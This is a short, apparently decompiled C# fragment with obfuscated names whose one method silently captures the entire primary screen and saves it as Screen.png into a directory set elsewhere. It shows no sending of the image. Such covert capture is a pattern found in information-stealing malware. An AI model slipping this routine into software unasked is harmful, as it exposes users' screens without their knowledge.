using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

internal class Class40
{
	public static void smethod_0()
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		string string_ = Class38.string_11;
		int width = Screen.get_PrimaryScreen().get_Bounds().Width;
		int height = Screen.get_PrimaryScreen().get_Bounds().Height;
		Bitmap val = new Bitmap(width, height);
		Graphics.FromImage((Image)(object)val).CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
		((Image)val).Save(string_ + "\\Screen.png", ImageFormat.get_Png());
	}
}
